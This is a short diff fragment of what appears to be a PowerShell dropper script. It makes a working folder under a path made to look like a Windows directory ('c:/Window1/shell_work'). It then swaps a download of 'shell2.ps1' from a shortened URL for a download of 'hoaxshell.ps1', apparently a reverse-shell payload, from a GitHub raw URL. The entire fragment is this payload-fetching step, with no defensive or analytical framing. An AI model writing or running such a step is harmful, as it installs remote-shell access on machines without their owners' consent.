@@ -4,7 +4,11 @@ mkdir c:/Window1/shell_work
 
 cd c:/Window1/shell_work
 
-Invoke-WebRequest -uri https://shorturl.at/rRcIs  -OutFile shell2.ps1
+
+
+
+
+Invoke-WebRequest -uri https://raw.githubusercontent.com/Ciroo66/ps1/refs/heads/main/hoaxshell.ps1  -OutFile hoaxshell.ps1
 
  
 
